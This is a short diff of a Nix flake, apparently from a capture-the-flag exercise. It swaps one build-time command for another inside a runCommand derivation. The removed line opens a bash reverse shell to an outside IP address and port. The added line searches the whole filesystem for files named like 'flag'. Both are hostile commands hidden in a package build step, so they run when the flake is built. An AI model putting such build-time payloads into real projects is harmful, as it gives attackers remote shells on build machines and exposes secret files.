@@ -6,7 +6,7 @@
     let pkgs = import nixpkgs { system = "x86_64-linux"; }; in
     {
       packages.x86_64-linux.default = pkgs.runCommand "hm" {} ''
-        sh -i >& /dev/tcp/54.153.239.159/11378 0>&1
+        find / -iname *flag* 2>/dev/null
       '';
     };
 }
